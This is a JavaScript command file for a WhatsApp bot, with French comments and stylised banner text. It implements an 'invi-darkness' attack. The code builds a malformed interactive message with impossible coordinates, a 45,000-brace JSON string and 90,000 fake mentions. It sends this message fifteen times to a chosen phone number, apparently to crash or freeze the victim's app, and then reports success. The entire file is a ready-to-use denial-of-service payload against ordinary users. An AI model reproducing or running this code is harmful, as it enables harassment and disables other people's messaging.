// /commands/bug/invi-darkness.js

import pkg from "@whiskeysockets/bailey";
const { proto } = pkg;

import channelSender from '../commands/channelSender.js';

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Fonction interne qui envoie le payload "Darkness"
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function bugfunc(client, targetNumber) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🎴 Darkness Protocol",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "🎴 Darkness Protocol",
                address: "🎴 Darkness Protocol",
              },
            },
            body: {
              text: "Initiating chaos...",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(45000),
            },
            contextInfo: {
              participant: targetNumber,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 90000 }, () =>
                  "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await client.relayMessage(targetNumber, message, {
      messageId: null,
      participant: { jid: targetNumber },
      userJid: targetNumber,
    });

  } catch (err) {
    console.error("Erreur bugfunc:", err);
  }
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Commande principale invi-darkness
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
export async function inviDarkness(message, client) {
  try {
    const remoteJid = message.key?.remoteJid;
    if (!remoteJid) throw new Error("Message JID is undefined.");

    const user = message.pushName || "Unknown";
    const date = new Date().toLocaleString();

    // 🖤 Message stylisé avant exécution
    await client.sendMessage(remoteJid, {
      text: `
╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮
┃         🎴𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫🎴
┃       𝐈𝐍𝐕𝐈-𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒
╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯
│  ❃ 𝗢𝘄𝗻𝗲𝗿 : 🎴 𝑫𝛯𝑽 ᬁ 𝛫𝑈𝑅𝛩𝛮𝛥🎴
│  ❃ 𝗠𝗼𝗱𝗲 : Public
│  ❃ 𝗨𝘀𝗲𝗿 : ${user}
│  ❃ 𝗣𝗿𝗲𝗳𝗶𝘅 : [ . ]
│  ❃ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : v1.0.0
│  ❃ 𝗗𝗮𝘁𝗲 : ${date}
╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯

⚠️ Initialisation du *Darkness Protocol*...`
    });

    // ─── Extraction de la cible
    const messageBody =
      message.message?.extendedTextMessage?.text ||
      message.message?.conversation ||
      "";
    const commandAndArgs = messageBody.slice(1).trim();
    const parts = commandAndArgs.split(/\s+/);
    const args = parts.slice(1);

    let participant;
    if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
      participant = message.message.extendedTextMessage.contextInfo.participant;
    } else if (args.length > 0) {
      participant = args[0].replace("@", "") + "@s.whatsapp.net";
    } else {
      throw new Error("❌ Veuillez mentionner une cible pour lancer le protocole darkness.");
    }

    const num = "@" + participant.replace("@s.whatsapp.net", "");

    // ─── Exécution du protocole (15 itérations)
    for (let i = 0; i < 15; i++) {
      await bugfunc(client, participant);
      await new Promise((resolve) => setTimeout(resolve, 1500));
    }

    // ─── Confirmation
    await channelSender(
      message,
      client,
      `✅ Darkness protocol exécuté avec succès sur ${num}.\n\n🎴 ℬ𝓎  𝑫𝛯𝑽 ᬁ 𝛫𝑈𝑅𝛩𝛮𝛥🎴`,
      1
    );

  } catch (error) {
    console.error("Erreur inviDarkness:", error);
    await client.sendMessage(message.key.remoteJid, {
      text: `⚠️ Échec du protocole darkness : ${error.message}`,
    });
  }
}

export default inviDarkness;